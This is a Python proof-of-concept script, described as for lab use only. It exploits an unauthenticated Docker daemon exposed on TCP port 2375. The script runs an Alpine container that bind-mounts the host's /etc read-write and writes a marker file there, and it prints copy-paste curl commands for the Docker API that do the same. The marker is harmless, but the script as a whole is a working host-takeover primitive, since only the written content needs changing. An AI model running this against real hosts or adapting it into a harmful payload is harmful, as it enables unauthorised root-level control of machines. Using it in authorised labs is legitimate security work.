#!/usr/bin/env python3
"""
safe_poc.py

Proof-of-concept (SAFE) to demonstrate that an exposed Docker daemon (tcp://<VULN-IP>:2375)
can be used to create a container that writes a harmless marker file into a bind-mounted
host directory (e.g. /etc). This script is intended for use **only in a controlled lab**
with explicit permission from the instructor.

It DOES NOT open remote shells, does NOT execute persistent payloads, and only writes
a short textual marker ("PROOF_OF_POC") to a file.

Usage:
  - Install docker-py (optional, the script will fall back to printing curl commands):
      pip install docker
  - Run:
      python3 safe_poc.py --target http://<VULN-IP>:2375
  - Example:
      python3 safe_poc.py --target http://192.168.x.y:2375

Outputs:
  - Attempts to create and start a short-lived container that writes /tmp/etc/pwned.txt
    (where /tmp/etc is the mountpoint for the host's /etc).
  - Prints the created container ID (if using docker-py) and the curl commands used (for audit).
"""

import argparse
import json
import shutil
import subprocess
import sys

DEFAULT_MARKER = "AUBRYYYYYYYYYYYYYYYYYYYYY"
MARKER_PATH_INSIDE = "/tmp/etc/pwned.txt"  # container path (host's /etc mounted at /tmp/etc)

def run_with_docker_py(target_url):
    try:
        import docker
    except Exception as e:
        print("docker-py not available (pip install docker). Falling back to curl output.")
        return False

    client = docker.DockerClient(base_url=target_url)
    print(f"[+] Using docker-py to contact {target_url}")

    cmd = f"sh -c \"echo {DEFAULT_MARKER} > {MARKER_PATH_INSIDE}\""
    binds = {'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}}

    print("[+] Pulling 'alpine:latest' (if not present)...")
    client.images.pull('alpine:latest')

    print("[+] Creating and starting container (safe marker write)...")
    container = client.containers.run('alpine:latest',
                                      cmd,
                                      remove=True,
                                      detach=False,
                                      volumes=binds)
    print("[+] Container run finished. Marker should be written by the daemon-controlled environment.")
    return True

def print_curl_commands(target_url):
    # Show the equivalent curl commands (safe, non-malicious)
    create_payload = {
      "Image": "alpine:latest",
      "Cmd": ["sh", "-c", f"echo {DEFAULT_MARKER} > {MARKER_PATH_INSIDE}"],
      "HostConfig": { "Binds": [ "/etc:/tmp/etc:rw" ] }
    }
    create_json = json.dumps(create_payload)
    print()
    print("[+] Equivalent curl commands (copy & paste in a terminal that can reach the target):")
    print()
    print("## 1) Create container - returns JSON with 'Id' field")
    print(f"curl -s -X POST {target_url}/containers/create -H 'Content-Type: application/json' -d '{create_json}' | jq .")
    print()
    print("## 2) Start container - replace <id> with the Id from the previous output")
    print(f"curl -s -X POST {target_url}/containers/<id>/start")
    print()
    print("[+] After starting, check the environment controlled by the daemon (e.g., `cat /etc/pwned.txt` on the daemon's filesystem or the host if the daemon manages the host filesystem).")

def main():
    parser = argparse.ArgumentParser(description="Safe PoC for Docker daemon exposed on TCP (lab only).")
    parser.add_argument("--target", required=True, help="Target Docker daemon base URL (e.g. http://192.168.1.81:2375)")
    parser.add_argument("--use-curl-only", action="store_true", help="Don't try docker-py, only print curl commands")
    args = parser.parse_args()

    target = args.target.rstrip('/')

    if args.use_curl_only:
        print_curl_commands(target)
        return

    # Try docker-py first
    ok = run_with_docker_py(target)
    if not ok:
        print_curl_commands(target)

if __name__ == "__main__":
    main()
